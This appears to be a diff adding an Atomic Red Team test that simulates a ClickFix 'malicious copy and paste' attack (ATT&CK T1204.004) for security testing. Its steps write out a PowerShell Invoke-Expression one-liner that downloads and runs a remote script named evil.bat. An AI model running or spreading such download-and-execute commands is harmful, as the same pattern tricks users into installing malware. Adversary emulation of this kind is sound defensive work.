@@ -1,0 +1,15 @@
+attack_technique: T1204.004
+display_name: Malicious Copy and Paste
+atomic_tests:
+  - name: Malicious Copy and Paste through Run.exe
+    description: "This test simulates a ClickFix attack where a user is asked to copy and paste a powershell command into run.exe. The powershell command uses Invoke-Expression to download and execute an obfuscated powershell file. Upon execution, a powershell window will open and display \"Hello World!\" for 30 seconds before closing. "
+    supported_platforms:
+      - windows
+    dependency_executor_name: ""
+    executor:
+      steps: |+
+        1.Open run.exe by pressing windows+R or opening the search bar and looking for run.exe
+        2.Copy the following command into the run.exe: iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/sp0r1um/atomic-red-team/refs/heads/T1204.004/atomics/T1204.004/src/evil.bat'))
+
+      name: manual
+      elevation_required: false
